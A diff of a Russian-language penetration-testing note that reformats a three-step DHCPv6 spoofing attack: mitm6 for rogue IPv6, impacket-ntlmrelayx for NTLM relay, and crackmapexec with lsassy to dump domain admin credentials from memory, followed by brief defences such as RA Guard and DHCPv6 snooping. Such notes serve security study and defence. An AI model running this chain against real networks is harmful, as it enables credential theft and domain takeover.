@@ -20,15 +20,22 @@
 
 -----
 1) Поднимаем подложный DHCP сервер, сразу отправляется RA пакеты, из-за того что windows периодически шлет Solicit запросы, то жертва сразу получает подложный IPv6 для DHCP сервера
-	`sudo mitm6 -i eth0`
+```bash
+sudo mitm6 -i eth0
+```
 
 2)  Включаем перехват NTLM хэшей аутентификации и релеем ее на реальный рабочий сервер
-	`sudo impacket-ntlmrelayx -smb2support -6 -t {real_server}`
+```bash
+sudo impacket-ntlmrelayx -smb2support -6 -t {real_server}
+```
+
 
 3) Взлом хэша локального администратора, если на сервер вошел администратор домена, то можно из памяти процесса lsassy вытащить его учетку
-	`sudo crackmapexec smb {real_server} -u administrator -H {NTLM_hash} --local-auth -M lsassy`
-
+```bash
+sudo crackmapexec smb {real_server} -u administrator -H {NTLM_hash} --local-auth -M lsassy
+```
 ## Защита от атаки DHCPv6 Spoofing/Rogue RA
+
 > **Отключение IPv6, если он не используется**
 > RA Guard
 > DHCPv6 Snooping
